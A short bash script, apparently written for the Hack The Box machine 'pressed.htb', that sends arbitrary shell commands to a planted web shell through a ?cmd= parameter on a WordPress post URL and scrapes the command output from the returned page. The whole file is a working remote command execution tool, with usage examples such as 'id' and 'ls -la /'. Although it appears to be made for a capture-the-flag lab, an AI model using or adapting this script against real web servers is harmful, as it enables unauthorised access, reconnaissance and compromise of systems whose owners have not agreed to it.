#!/bin/bash

# Check if command argument is provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <command>"
    echo "Example: $0 id"
    echo "Example: $0 'whoami'"
    echo "Example: $0 'ls -la /'"
    exit 1
fi

# Base URL
BASE_URL="http://pressed.htb/index.php/2022/01/28/hello-world/"

# URL encode the command
# Using printf to handle basic URL encoding
encode_command() {
    local cmd="$1"
    # Replace spaces with %20
    echo "$cmd" | sed 's/ /%20/g;s/&/%26/g;s/?/%3F/g;s/=/%3D/g'
}

# Get the command from arguments
CMD="$*"
ENCODED_CMD=$(encode_command "$CMD")
FULL_URL="${BASE_URL}?cmd=${ENCODED_CMD}"

echo "[*] Executing: $CMD"
echo "[*] URL: $FULL_URL"
echo "[*] Output:"

# Fetch and extract the command output
curl -s "$FULL_URL" | awk '/<\/table>/{getline; gsub(/<p>|<\/p>/,""); print}'